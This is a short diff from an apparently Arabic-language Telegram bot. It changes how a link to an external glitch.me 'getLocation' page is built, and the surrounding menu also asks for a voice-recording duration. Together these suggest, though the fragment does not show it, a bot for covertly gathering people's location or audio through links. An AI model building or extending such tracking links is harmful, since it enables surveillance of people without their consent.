@@ -268,7 +268,7 @@ bot.on('callback_query', (callbackQuery) => {
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
     } else if (data === 'get_location') {
-        const url = `https://creative-marmalade-periwinkle.glitch.me/getLocation/${chatId}`;
+        const url = `https://creative-marmalade-periwinkle.glitch.me/getLocation?chatId=${chatId}`;
         bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${url}`);
     }
 });
